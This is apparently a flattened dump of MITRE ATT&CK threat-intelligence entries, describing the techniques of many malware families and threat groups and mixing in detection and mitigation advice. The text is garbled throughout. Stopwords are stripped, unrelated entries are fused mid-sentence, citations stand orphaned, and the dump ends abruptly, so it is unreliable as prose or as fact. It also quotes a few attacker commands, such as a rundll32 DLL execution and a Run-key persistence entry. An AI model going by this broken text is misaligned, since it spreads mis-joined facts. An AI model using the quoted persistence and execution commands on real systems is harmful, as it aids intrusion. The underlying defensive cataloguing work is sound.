FireEye Hacking FIN4 Dec 2014)(Citation: FireEye Hacking FIN4 Video Dec 2014) [Remcos](https://attack.mitre.org/software/S0332) searches Sandboxie VMware system.(Citation: Talos Remcos Aug 2018) [Strider](https://attack.mitre.org/groups/G0041) registered persistence module domain controllers Windows LSA (Local Authority) password filter acquire credentials time domain, local user, administrator logs password.(Citation: Kaspersky ProjectSauron Report) [njRAT](https://attack.mitre.org/software/S0385) observed communicating uncommon TCP ports, including 1177 8282.(Citation: Fidelis njRAT June 2013)(Citation: Trend Micro njRAT 2018)(Citation: Citizen Lab Group5) [Emotet](https://attack.mitre.org/software/S0367) observed communicating standard ports, including 7080 50000.(Citation: Kaspersky Emotet Jan 2019)(Citation: Picus Emotet Dec 2018)(Citation: Sophos Emotet Apr 2019)(Citation: Talos Emotet Jan 2019) [Naikon](https://attack.mitre.org/groups/G0019) schtasks.exe lateral movement compromised networks.(Citation: Bitdefender Naikon April 2021) (Citation: Kaspersky Turla) [TinyZBot](https://attack.mitre.org/software/S0004) create shortcut Windows startup folder persistence.(Citation: Cylance Cleaver) [MuddyWater](https://attack.mitre.org/groups/G0069) native Windows cabinet creation tool, makecab.exe, compress stolen data uploaded.(Citation: Symantec MuddyWater Dec 2018) [STARWHALE](https://attack.mitre.org/software/S1037) relied victims malicious Excel file execution.(Citation: DHS CISA AA22-055A MuddyWater February 2022) [InvisiMole](https://attack.mitre.org/software/S0260) ListPlanting inject code trusted process.(Citation: ESET InvisiMole June 2020) [APT28](https://attack.mitre.org/groups/G0007) collected files repositories.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [Duqu](https://attack.mitre.org/software/S0038) custom command control protocol communicates commonly ports, frequently encapsulated application layer protocols.(Citation: Symantec W32.Duqu) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) Linear Feedback Shift Register (LFSR) algorithm network encryption.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [C0010](https://attack.mitre.org/campaigns/C0010), threat actors compromised login legitimate Israeli shipping company established watering hole collected visitor information.(Citation: Mandiant UNC3890 Aug 2022) [Green Lambert](https://attack.mitre.org/software/S0690) proxy victim's machine environment variables.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021)  (Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit 42 Playbook Dec 2017) [IronNetInjector](https://attack.mitre.org/software/S0581) disguised legitimate service PythonUpdateSrvc.(Citation: Unit 42 IronNetInjector February 2021 ) [Astaroth](https://attack.mitre.org/software/S0373)'s initial payload malicious .LNK file. (Citation: Cofense Astaroth Sept 2018)(Citation: Cybereason Astaroth Feb 2019) [EnvyScout](https://attack.mitre.org/software/S0634) cmd.exe execute malicious files compromised hosts.(Citation: MSTIC Nobelium Toolset 2021) [IcedID](https://attack.mitre.org/software/S0483) embedded binaries RC4 encrypted .png files.(Citation: Juniper IcedID June 2020) [UNC2452](https://attack.mitre.org/groups/G0118) bypassed MFA set OWA accounts generating cookie stolen secret key.(Citation: Volexity SolarWinds) [AppleJeus](https://attack.mitre.org/software/S0584) installed MSI installer.(Citation: CISA AppleJeus Feb 2021) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors `net` command retrieve domain accounts.(Citation: FoxIT Wocao December 2019)  [Sandworm Team](https://attack.mitre.org/groups/G0034) created domain accounts ICS access server.(Citation: Dragos Crashoverride 2018) [BLUELIGHT](https://attack.mitre.org/software/S0657) cloud providers C2.(Citation: Volexity InkySquid BLUELIGHT August 2021) [SslMM](https://attack.mitre.org/software/S0058) creates thread implementing keylogging facility Windows Keyboard Accelerators.(Citation: Baumgartner Naikon 2015) [BloodHound](https://attack.mitre.org/software/S0521) .NET API calls SharpHound ingestor component pull Active Directory data.(Citation: GitHub Bloodhound) Anti-virus automatically quarantine suspicious files.  [Ramsay](https://attack.mitre.org/software/S0458) gather list running processes [Tasklist](https://attack.mitre.org/software/S0057).(Citation: Antiy CERT Ramsay April 2020) [POSHSPY](https://attack.mitre.org/software/S0150) PowerShell execute commands, execute payload.(Citation: FireEye POSHSPY April 2017) (Citation: Villeneuve 2014) (Citation: F-Secure Dukes)(Citation: Secureworks IRON HEMLOCK Profile) Close browser sessions regularly needed. [Kobalos](https://attack.mitre.org/software/S0641)'s post-authentication communication channel 32-byte-long password RC4 inbound outbound traffic.(Citation: ESET Kobalos Feb 2021)(Citation: ESET Kobalos Jan 2021)  [DOGCALL](https://attack.mitre.org/software/S0213) capable capturing screenshots victim's machine.(Citation: FireEye APT37 Feb 2018)(Citation: Unit 42 Nokki Oct 2018) [JHUHUGIT](https://attack.mitre.org/software/S0044) .bat file execute .dll.(Citation: Talos Seduploader Oct 2017) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Adversaries instruct [Duqu](https://attack.mitre.org/software/S0038) spread laterally copying shares enumerated legitimate credentials (via keylogging means). remote host infected compromised credentials schedule task remote machines executes malware.(Citation: Symantec W32.Duqu) [Ebury](https://attack.mitre.org/software/S0377) embedded modified OpenSSH binaries gain persistent access SSH credential information.(Citation: ESET Ebury Feb 2014) (Citation: Mandiant UNC3890 Aug 2022) [APT38](https://attack.mitre.org/groups/G0082) DYEPACK manipulate SWIFT messages en route printer.(Citation: FireEye APT38 Oct 2018) [hcdLoader](https://attack.mitre.org/software/S0071) installs service persistence.(Citation: Dell Lateral Movement)(Citation: ThreatStream Evasion Analysis) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) FakeTLS session authentication.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) Container administration service activities executed commands captured logging process execution command-line arguments container underlying host. [JCry](https://attack.mitre.org/software/S0389) VBS scripts. (Citation: Carbon Black JCry 2019) [Kevin](https://attack.mitre.org/software/S1020) delete files created victim's machine.(Citation: Kaspersky Lyceum October 2021) [Gazer](https://attack.mitre.org/software/S0168) execute task download file.(Citation: ESET Gazer Aug 2017)(Citation: Securelist WhiteBear Aug 2017) [FunnyDream](https://attack.mitre.org/software/S1044) check `Software\Microsoft\Windows\CurrentVersion\Internet Settings` extract `ProxyServer` string.(Citation: Bitdefender FunnyDream Campaign November 2020) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) [PowerShell](https://attack.mitre.org/techniques/T1059/001) scripts.(Citation: Morphisec ShellTea June 2019) [StrifeWater](https://attack.mitre.org/software/S1034) collect time zone victim's machine.(Citation: Cybereason StrifeWater Feb 2022) [UNC2452](https://attack.mitre.org/groups/G0118) account credentials attempt access Managed Service Account (gMSA) passwords.(Citation: Deep Dive Solorigate January 2021) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) executed custom-compiled XMRIG miner DLLs configuring execute "wercplsupport" service.(Citation: RedCanary Mockingbird 2020)	 Monitor direct access read/write attempts <code>\\\\.\\</code> notation.(Citation: Sysmon v6 2017) Monitor unusual kernel driver installation activity. [OilRig](https://attack.mitre.org/groups/G0049) tools identify mouse connected targeted system.(Citation: Check APT34 April 2021) [Bazar](https://attack.mitre.org/software/S0534) Winlogon Helper DLL establish persistence.(Citation: Zscaler Bazar September 2020) [RATANKBA](https://attack.mitre.org/software/S0241) gathers victim’s IP address <code>ipconfig -all</code> command.(Citation: Lazarus RATANKBA)(Citation: RATANKBA) [Xbash](https://attack.mitre.org/software/S0341) execute malicious JavaScript payloads victim’s machine.(Citation: Unit42 Xbash Sept 2018) Set directory access controls prevent file writes search paths applications, folders applications standard dylib folders. [Pony](https://attack.mitre.org/software/S0453) collected Service Pack, language, region send C2.(Citation: Malwarebytes Pony April 2016)	 [Shamoon](https://attack.mitre.org/software/S0140) copies executable payload target [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) scheduling unnamed task execute malware.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016) [BitPaymer](https://attack.mitre.org/software/S0570) attempted install service maintain persistence.(Citation: Crowdstrike Indrik November 2018) [Cobalt Group](https://attack.mitre.org/groups/G0080) DNS tunneling C2.(Citation: Talos Cobalt July 2018)(Citation: PTSecurity Cobalt Dec 2016)(Citation: IB Cobalt Aug 2017) [Carberp](https://attack.mitre.org/software/S0484) searched Image File Execution Options registry key "Debugger" subkey.(Citation: Prevx Carberp March 2011) [HELLOKITTY](https://attack.mitre.org/software/S0617) ability enumerate network resources.(Citation: FireEye FiveHands April 2021) Restrict protocols encryption authentication mechanisms. Limit access administrative management interfaces untrusted network sources.  [gh0st RAT](https://attack.mitre.org/software/S0032) RC4 XOR encrypt C2 traffic.(Citation: Nccgroup Gh0st April 2018) Deny direct remote access internal systems network proxies, gateways, firewalls.  Monitor executed commands arguments abuse Windows command execution. Usage Windows command common administrator, developer, power user systems depending job function. scripting restricted normal users, attempt enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent. [OilRig](https://attack.mitre.org/groups/G0049) DNS C2 including publicly <code>requestbin.net</code> tunneling service.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: FireEye APT34 July 2019)(Citation: Check APT34 April 2021) Monitor unusual Exchange Office 365 email account permissions excessively broad permissions (including memberships privileged groups) granted compromised accounts. Limit permissions creating modifying platform images containers based principle privilege. endpoint security solutions configured block types process injection based common sequences behavior occur injection process.  [Magic Hound](https://attack.mitre.org/groups/G0059) SMS email messages links designed steal credentials.(Citation: Certfa Charming Kitten January 2021)(Citation: ClearSky Kittens 3 August 2020)(Citation: Proofpoint TA453 March 2021)(Citation: Proofpoint TA453 July2021) [StrongPity](https://attack.mitre.org/software/S0491) parse hard drive compromised host identify specific file extensions.(Citation: Talos Promethium June 2020) [Moses Staff](https://attack.mitre.org/groups/G1009) signed drivers source tool called DiskCryptor evade detection.(Citation: Checkpoint MosesStaff Nov 2021) [Cobalt Strike](https://attack.mitre.org/software/S0154) query <code>HKEY_CURRENT_USER\Software\Microsoft\Office\<Excel Version>\Excel\Security\AccessVBOM\</code>  determine security setting restricting default programmatic access enabled.(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) [Gelsemium](https://attack.mitre.org/software/S0666) check presence specific security products.(Citation: ESET Gelsemium June 2021) [Goopy](https://attack.mitre.org/software/S0477) ability communicate C2 HTTP.(Citation: Cybereason Cobalt Kitty 2017)	 [TeamTNT](https://attack.mitre.org/groups/G0139) searched security products infected machines.(Citation: ATT TeamTNT Chimaera September 2020)(Citation: Cisco Talos Intelligence Group) [USBferry](https://attack.mitre.org/software/S0452) execute Windows commands.(Citation: TrendMicro Tropic Trooper 2020)	 (Citation: Securelist APT Trends Q2 2017) [Empire](https://attack.mitre.org/software/S0363) built-in modules abuse trusted utilities MSBuild.exe.(Citation: Github PowerShell Empire)
 [Patchwork](https://attack.mitre.org/groups/G0040) collected exfiltrated files infected system.(Citation: Cymmetria Patchwork) [DropBook](https://attack.mitre.org/software/S0547) unarchive data downloaded C2 payload persistence modules.(Citation: Cybereason Molerats Dec 2020)  [SILENTTRINITY](https://attack.mitre.org/software/S0692) collect credentials Internet Explorer/Edge.(Citation: GitHub SILENTTRINITY Modules July 2019) [SHARPSTATS](https://attack.mitre.org/software/S0450) ability employ custom PowerShell script.(Citation: TrendMicro POWERSTATS V3 June 2019) [Trojan.Karagany](https://attack.mitre.org/software/S0094) inject suspended thread process process initiate <code>ResumeThread</code> API.(Citation: Secureworks Karagany July 2019) Monitor executed commands arguments perform sudo caching suoders file elevate privileges, <code>sudo</code> command. link visited user, network intrusion prevention systems systems designed scan remove malicious downloads block activity. [UNC2452](https://attack.mitre.org/groups/G0118) Rundll32 execute payloads.(Citation: - Customer Guidance Nation-State Cyber Attacks)(Citation: Deep Dive Solorigate January 2021) password user's login keychain changed user's login password. increases complexity adversary additional password. [jRAT](https://attack.mitre.org/software/S0283) list security software, WMIC identify anti-virus products installed victim’s machine firewall details.(Citation: jRAT Symantec Aug 2018)(Citation: Kaspersky Adwind Feb 2016) Malware [Group5](https://attack.mitre.org/groups/G0043) capable watching victim's screen.(Citation: Citizen Lab Group5) Monitor newly executed processes indicative credential dumping. Windows 8.1 Windows Server 2012 R2, monitor Windows Logs LSASS.exe creation verify LSASS started protected process. [Sandworm Team](https://attack.mitre.org/groups/G0034) backdoor execute supplied DLL rundll32.exe.(Citation: ESET Telebots July 2017)	 [PingPull](https://attack.mitre.org/software/S1031) ability install service.(Citation: Unit 42 PingPull Jun 2022) separate infrastructure managing critical systems prevent overlap credentials permissions systems vectors lateral movement. [Clambling](https://attack.mitre.org/software/S0660) ability enumerate network shares.(Citation: Trend Micro DRBControl February 2020) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) download additional files payloads compromised hosts.(Citation: FireEye Enemy FIN8 Aug 2016)(Citation: Morphisec ShellTea June 2019) [Remsec](https://attack.mitre.org/software/S0125) package collects documents inserted USB sticks.(Citation: Kaspersky ProjectSauron Technical Analysis) [Smoke Loader](https://attack.mitre.org/software/S0226) simple one-byte XOR method obfuscate values malware.(Citation: Malwarebytes SmokeLoader 2016)(Citation: Talos Smoke Loader July 2018) [PlugX](https://attack.mitre.org/software/S0013) disguised legitimate Adobe PotPlayer files.(Citation: Proofpoint TA416 Europe March 2022) [OLDBAIT](https://attack.mitre.org/software/S0138) obfuscates internal strings unpacks startup.(Citation: FireEye APT28) [Epic](https://attack.mitre.org/software/S0091) gathers list user accounts, privilege classes, time logon.(Citation: Kaspersky Turla Aug 2014) [Olympic Destroyer](https://attack.mitre.org/software/S0365) WMI propagate network.(Citation: Talos Olympic Destroyer 2018) [Cobalt Group](https://attack.mitre.org/groups/G0080) executed JavaScript scriptlets victim's machine.(Citation: Talos Cobalt July 2018)(Citation: PTSecurity Cobalt Aug 2017)(Citation: IB Cobalt Aug 2017)(Citation: Morphisec Cobalt Gang Oct 2018)(Citation: Unit 42 Cobalt Gang Oct 2018)(Citation: TrendMicro Cobalt Nov 2017) [OilRig](https://attack.mitre.org/groups/G0049) download remote files victims.(Citation: FireEye APT34 Dec 2017) Monitor newly assigned drive letters mount data storage device attempt exfiltrate data USB connected physical device. [RegDuke](https://attack.mitre.org/software/S0511) decrypt strings key stored Registry hardcoded code.(Citation: ESET Dukes October 2019) Ensure proper isolation critical network systems firewalls. [Hikit](https://attack.mitre.org/software/S0009) C2.(Citation: FireEye HIKIT Rootkit 2) [PipeMon](https://attack.mitre.org/software/S0501) iterate running processes suitable injection target.(Citation: ESET PipeMon 2020) [Turla](https://attack.mitre.org/groups/G0010) compromised internal network systems proxy traffic C2.(Citation: Talos TinyTurla September 2021) [Tarrask](https://attack.mitre.org/software/S1011) delete Security Descriptor (`SD`) registry subkey “hide” scheduled tasks.(Citation: Tarrask scheduled task) [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware gathers registered user primary owner WMI.(Citation: Citizen Lab Stealth Falcon 2016) [StrongPity](https://attack.mitre.org/software/S0491) file searcher component automatically collect archive files based predefined list file extensions.(Citation: Bitdefender StrongPity June 2020) [Caterpillar WebShell](https://attack.mitre.org/software/S0572) command modify Registry key.(Citation: ClearSky Lebanese Cedar Jan 2021) [BoomBox](https://attack.mitre.org/software/S0635) check current directory presence specific file terminate specific values found.(Citation: MSTIC Nobelium Toolset 2021)  [Sliver](https://attack.mitre.org/software/S0633) ability support C2 communications HTTP/S.(Citation: Cybersecurity Advisory SVR TTP 2021)(Citation: Bishop Fox Sliver Framework August 2019)(Citation: GitHub Sliver C2) Monitor newly constructed processes command-lines applications adversary gain initial access require user interaction. includes compression applications, zip files, Deobfuscate/Decode Files payloads. [OilRig](https://attack.mitre.org/groups/G0049) <code>netstat -an</code> victim listing network connections.(Citation: Palo Alto OilRig 2016) [Bisonal](https://attack.mitre.org/software/S0268) deleted Registry clean prior activity.(Citation: Talos Bisonal Mar 2020)  Monitor creation files (especially DLLs webservers) abused malicious ISAPI extensions/filters IIS modules. [PLEAD](https://attack.mitre.org/software/S0435) samples highly obfuscated junk code.(Citation: ESET PLEAD Malware July 2018)(Citation: TrendMicro BlackTech June 2017) Monitor executed commands arguments gather victim's physical location(s) targeting. Detecting environmental keying difficult depending implementation. [Final1stspy](https://attack.mitre.org/software/S0355) C2.(Citation: Unit 42 Nokki Oct 2018) [HOPLIGHT](https://attack.mitre.org/software/S0376) svchost.exe execute malicious DLL .(Citation: US-CERT HOPLIGHT Apr 2019) Establish centralized logging instance activity, monitor review events reverting snapshot, rolling changes, changing persistence/type storage. Monitor events activation instances occurring normal activity/planned operations. reduce false positives, valid change management procedures introduce identifier logged change tag header) supported cloud provider, distinguish valid, expected actions malicious ones. [PowerDuke](https://attack.mitre.org/software/S0139) command download file.(Citation: Volexity PowerDuke November 2016) [Higaisa](https://attack.mitre.org/groups/G0126) JavaScript execute additional files.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)(Citation: PTSecurity Higaisa 2020) [KillDisk](https://attack.mitre.org/software/S0607) terminates processes user reboot victim machine.(Citation: Trend Micro KillDisk 2) (Citation: Crowdstrike Indrik November 2018) [FrameworkPOS](https://attack.mitre.org/software/S0503) DNS tunneling exfiltration credit card data.(Citation: SentinelOne FrameworkPOS September 2019) Configure Increase Scheduling Priority option Administrators rights schedule priority process. configured GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. (Citation: TechNet Scheduling Priority) [SHARPSTATS](https://attack.mitre.org/software/S0450) ability upload download files.(Citation: TrendMicro POWERSTATS V3 June 2019) Monitor executed commands arguments delete alter generated artifacts host system, including logs captured files quarantined emails.  [Imminent Monitor](https://attack.mitre.org/software/S0434) capability cryptocurrency miner victim machine.(Citation: Imminent Unit42 Dec2019) [Carbon](https://attack.mitre.org/software/S0335) send data C2 server.(Citation: ESET Carbon Mar 2017) [RobbinHood](https://attack.mitre.org/software/S0400) search Windows services antivirus software kill process.(Citation: CarbonBlack RobbinHood 2019)  [APT28](https://attack.mitre.org/groups/G0007) executed [CHOPSTICK](https://attack.mitre.org/software/S0023) rundll32 commands <code>rundll32.exe “C:\Windows\twain_64.dll”</code>. [APT28](https://attack.mitre.org/groups/G0007) executed .dll stage dropper rundll32.exe. [APT28](https://attack.mitre.org/groups/G0007) loader Trojan saved batch script rundll32 execute DLL payload.(Citation: Crowdstrike DNC June 2016)(Citation: Bitdefender APT28 Dec 2015)(Citation: Palo Alto Sofacy 06-2018)(Citation: Unit 42 Playbook Dec 2017)(Citation: ESET Zebrocy 2019)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [Pandora](https://attack.mitre.org/software/S0664) identify incoming traffic token intercept traffic process received command.(Citation: Trend Micro Iron Tiger April 2021) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Set account lockout policies failed login attempts prevent passwords guessed. strict policy create denial service condition render environments un-usable, accounts brute force locked-out. (Citation: Cybereason Molerats Dec 2020) Monitor discrepancies authentication cloud services, PTA sign-ins recorded Azure lack events AD.(Citation: Azure PTA Vulnerabilities) [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors set remote tunneling SSH tool maintain access compromised environment.(Citation: BlackBerry CostaRicto November 2020) [QuietSieve](https://attack.mitre.org/software/S0686) search files target host extension, including doc, docx, xls, rtf, odt, txt, jpg, pdf, rar, zip, 7z.(Citation: Actinium February 2022)  [ThreatNeedle](https://attack.mitre.org/software/S0665) collect data files compromised host.(Citation: Kaspersky ThreatNeedle Feb 2021) [DOGCALL](https://attack.mitre.org/software/S0213) download execute additional payloads.(Citation: Unit 42 Nokki Oct 2018) [LoudMiner](https://attack.mitre.org/software/S0451) SCP update miner C2.(Citation: ESET LoudMiner June 2019) strict approval policy deployment systems. [TeamTNT](https://attack.mitre.org/groups/G0139) deployed XMRig Docker images cryptocurrency.(Citation: Lacework TeamTNT 2021)(Citation: Cado Security TeamTNT Worm August 2020) [TeamTNT](https://attack.mitre.org/groups/G0139) infected Docker containers Kubernetes clusters XMRig, RainbowMiner lolMiner mining cryptocurrency.(Citation: Cisco Talos Intelligence Group) Monitor cloud services unexpected modifications settings data. (Citation: Korean FSI TA505 2020)(Citation: BlackBerry Amadey 2020) [KGH_SPY](https://attack.mitre.org/software/S0526) ability download execute code remote servers.(Citation: Cybereason Kimsuky November 2020) [GreyEnergy](https://attack.mitre.org/software/S0342) encrypts communications RSA-2048.(Citation: ESET GreyEnergy Oct 2018) [NETWIRE](https://attack.mitre.org/software/S0198) ability steal credentials browsers including Internet Explorer, Opera, Yandex, Chrome.(Citation: FireEye NETWIRE March 2019)(Citation: Red Canary NETWIRE January 2020)(Citation: Proofpoint NETWIRE December 2020) [Remcos](https://attack.mitre.org/software/S0332) launch remote command execute commands victim’s machine.(Citation: Fortinet Remcos Feb 2017) [Flagpro](https://attack.mitre.org/software/S0696) execute <code>net localgroup administrators</code> command targeted system.(Citation: NTT Security Flagpro December 2021) [Pony](https://attack.mitre.org/software/S0453) delayed execution built-in function avoid detection analysis.(Citation: Malwarebytes Pony April 2016)	 [Hildegard](https://attack.mitre.org/software/S0601) modified /etc/ld.so.preload overwrite readdir() readdir64().(Citation: Unit 42 Hildegard Malware) (Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019) [APT3](https://attack.mitre.org/groups/G0022) identify Office documents victim's computer.(Citation: aptsim) [Chaes](https://attack.mitre.org/software/S0631) script extracts session cookie sends C2 server.(Citation: Cybereason Chaes Nov 2020)  Train users aware existence malicious images avoid deploying instances containers them. [FunnyDream](https://attack.mitre.org/software/S1044) monitor files automatically collect them.(Citation: Bitdefender FunnyDream Campaign November 2020) [EVILNUM](https://attack.mitre.org/software/S0568) changed creation files.(Citation: Prevailion EvilNum 2020) versions [CozyCar](https://attack.mitre.org/software/S0046) check ensure executed virtual machine malware analysis sandbox environment. detects is, exit.(Citation: F-Secure CozyDuke) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) tools (such Mimikatz WCE) perform credential dumping.(Citation: Secureworks BRONZE BUTLER Oct 2017) [gh0st RAT](https://attack.mitre.org/software/S0032) encrypted protocol TCP segments communicate C2.(Citation: Gh0stRAT ATT March 2019) [Ferocious Kitten](https://attack.mitre.org/groups/G0137) conducted spearphishing campaigns malicious documents lure victims attachments.(Citation: Kaspersky Ferocious Kitten Jun 2021) [OSX/Shlayer](https://attack.mitre.org/software/S0402) masquerade Flash Player update.(Citation: Carbon Black Shlayer Feb 2019)(Citation: Intego Shlayer Feb 2018) Monitor executed commands arguments establish persistence executing malicious content triggered interrupt signal. [DnsSystem](https://attack.mitre.org/software/S1021) Windows user create unique identification infected users systems.(Citation: Zscaler Lyceum DnsSystem June 2022) Monitor API calls attempt access credential material stored process memory Local Security Authority Subsystem Service (LSASS). Disable SSH host restrict SSH access specific users/groups <code>/etc/ssh/sshd_config</code>. Limit remote user permissions remote access necessary. [IronNetInjector](https://attack.mitre.org/software/S0581) task XML file named <code>mssch.xml</code> IronPython script user logs specific events created.(Citation: Unit 42 IronNetInjector February 2021 ) [ConnectWise](https://attack.mitre.org/software/S0591) execute PowerShell commands target machines.(Citation: Anomali Static Kitten February 2021) [MacMa](https://attack.mitre.org/software/S1016) enumerate running processes.(Citation: ESET DazzleSpy Jan 2022) implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery. Monitor new, unfamiliar DLL files written domain controller local computer. Password filters autorun loaded DLL lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013) FS use, monitor FS server creation DLLs loading unrecognized unsigned DLLs `Microsoft.IdentityServer.Servicehost` application.(Citation: MagicWeb) Set PowerShell execution policy execute signed scripts. Monitor unexpected processes interacting authentication process domain controller bypass typical authentication mechanisms enable access accounts. [Pysa](https://attack.mitre.org/software/S0583) laterally moved RDP connections.(Citation: CERT-FR PYSA April 2020)  [jRAT](https://attack.mitre.org/software/S0283) serve SOCKS proxy server.(Citation: Kaspersky Adwind Feb 2016) [Shamoon](https://attack.mitre.org/software/S0140) decrypts ciphertext XOR cipher base64-encoded string.(Citation: Unit 42 Shamoon3 2018)	 Monitor firewall rules unexpected modifications allow/block specific network traffic attempt hide artifacts behaviors evade detection. [Sibot](https://attack.mitre.org/software/S0589) download execute payload compromised system.(Citation: MSTIC NOBELIUM Mar 2021) Monitor executed commands arguments attempt detailed operating hardware, including version, patches, hotfixes, service packs, architecture. network devices, monitor executed commands AAA logs, unexpected unauthorized users. disabling updating ARP cache gratuitous ARP replies. document Graphical User Interface (GUI) malicious p-code decompiled viewed. However, <code>PROJECT</code> stream, specifies project properties, modified specific decompiled VBA code displayed. example, adding module undefined <code>PROJECT</code> stream inhibit attempts reading VBA source code GUI.(Citation: FireEye VBA stomp Feb 2020) [GoldenSpy](https://attack.mitre.org/software/S0493) Ryeol Client facilitate internet communication.(Citation: Trustwave GoldenSpy June 2020) [HermeticWizard](https://attack.mitre.org/software/S0698) connect remote shares `WNetAddConnection2W`.(Citation: ESET Hermetic Wizard March 2022) [Leafminer](https://attack.mitre.org/groups/G0077) tools retrieving login password information, including LaZagne.(Citation: Symantec Leafminer July 2018) [SILENTTRINITY](https://attack.mitre.org/software/S0692) ability leverage API including `GetProcAddress` `LoadLibrary`.(Citation: GitHub SILENTTRINITY Modules July 2019) Monitor executed commands arguments add user subsequently hide login screens. [HermeticWizard](https://attack.mitre.org/software/S0698) machines local network gathering local IP addresses `DNSGetCacheDataTable`, `GetIpNetTable`,`WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY)`,`NetServerEnum`,`GetTcpTable`, `GetAdaptersAddresses.`(Citation: ESET Hermetic Wizard March 2022) (Citation: TrendMicro Lazarus Nov 2018) [Javali](https://attack.mitre.org/software/S0528) MSI installer download execute malicious payloads.(Citation: Securelist Brazilian Banking Malware July 2020) Monitor newly constructed processes command execution remove network share connections net.exe process.  [Kessel](https://attack.mitre.org/software/S0487) exfiltrated data hexadecimal-encoded subdomain fields DNS queries.(Citation: ESET ForSSHe December 2018) [Patchwork](https://attack.mitre.org/groups/G0040) embedded malicious macro Word document lured victim icon execute malware.(Citation: TrendMicro Patchwork Dec 2017)(Citation: Volexity Patchwork June 2018) [Conficker](https://attack.mitre.org/software/S0608) adds Registry establish persistence.(Citation: Trend Micro Conficker) [PLEAD](https://attack.mitre.org/software/S0435) ability upload download files infected host.(Citation: JPCert PLEAD Downloader June 2018) [XCSSET](https://attack.mitre.org/software/S0658) <code>chmod +x</code> command grant executable permissions malicious file.(Citation: 20 macOS Common Tools Techniques) [Leviathan](https://attack.mitre.org/groups/G0065) valid accounts gain initial access.(Citation: CISA AA21-200A APT40 July 2021)(Citation: Accenture MUDCARP March 2019) Monitor files abuse Office add-ins persistence compromised system. [TinyZBot](https://attack.mitre.org/software/S0004) install Windows service persistence.(Citation: Cylance Cleaver) [UPPERCUT](https://attack.mitre.org/software/S0275) capability gather system’s hostname OS version.(Citation: FireEye APT10 Sept 2018) [Silent Librarian](https://attack.mitre.org/groups/G0122) cloned victim organization login staged credential harvesting campaigns. [Silent Librarian](https://attack.mitre.org/groups/G0122) variety URL shorteners staged websites.(Citation: Secureworks COBALT DICKENS September 2019)(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Monitor drive letters mount data storage devices attempts read sensitive locations partition boot sector, master boot record, disk partition table, BIOS parameter block/superblock. Encrypt data flows reduce impact tailored modifications data transit. [Winnti Windows](https://attack.mitre.org/software/S0141) determine OS compromised host Windows XP.(Citation: Novetta Winnti April 2015) [BabyShark](https://attack.mitre.org/software/S0414) executed <code>ver</code> command.(Citation: Unit42 BabyShark Feb 2019)	 [menuPass](https://attack.mitre.org/groups/G0045) modified version pentesting tools wmiexec.vbs secretsdump.py dump credentials.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: Github AD-Pentest-Script) [SysUpdate](https://attack.mitre.org/software/S0663) ability capture screenshots.(Citation: Trend Micro Iron Tiger April 2021) [Epic](https://attack.mitre.org/software/S0091) encrypts collected data public key framework sending C2 channel.(Citation: Kaspersky Turla) variants encrypt collected data AES encode base64 transmitting C2 server.(Citation: Kaspersky Turla Aug 2014) [S-Type](https://attack.mitre.org/software/S0085) create file <code>%HOMEPATH%\Start Menu\Programs\Startup\Realtek {Unique Identifier}.lnk</code>, malicious `msdtc.exe` file created `%CommonFiles%` directory.(Citation: Cylance Dust Storm) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors RAT malware exfiltrate email archives.(Citation: McAfee Night Dragon) [Bisonal](https://attack.mitre.org/software/S0268) rundll32.exe execute Registry key adds: <code>HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\”vert” = “rundll32.exe c:\windows\temp\pvcu.dll , Qszdez”</code>.(Citation: Unit 42 Bisonal July 2018) [Kinsing](https://attack.mitre.org/software/S0599) SSH lateral movement.(Citation: Aqua Kinsing April 2020) [Silence](https://attack.mitre.org/groups/G0091) valid certificate sign primary loader Silence.Downloader (aka TrueBot).(Citation: IB Silence Aug 2019) Monitor executed commands arguments employ detect avoid virtualization analysis environments. Detecting actions virtualization sandbox identification difficult depending adversary's implementation monitoring required. service necessary, lock critical enclaves separate WinRM accounts permissions. local DNS sinkhole prevent DGA-based command control reduced cost. [Winnti Linux](https://attack.mitre.org/software/S0430) ability deploy modules command control (C2) servers, remote command execution, file exfiltration, socks5 proxying infected host. (Citation: Chronicle Winnti Linux 2019) [EXOTIC LILY](https://attack.mitre.org/groups/G1011) file-sharing services including WeTransfer, TransferNow, OneDrive deliver 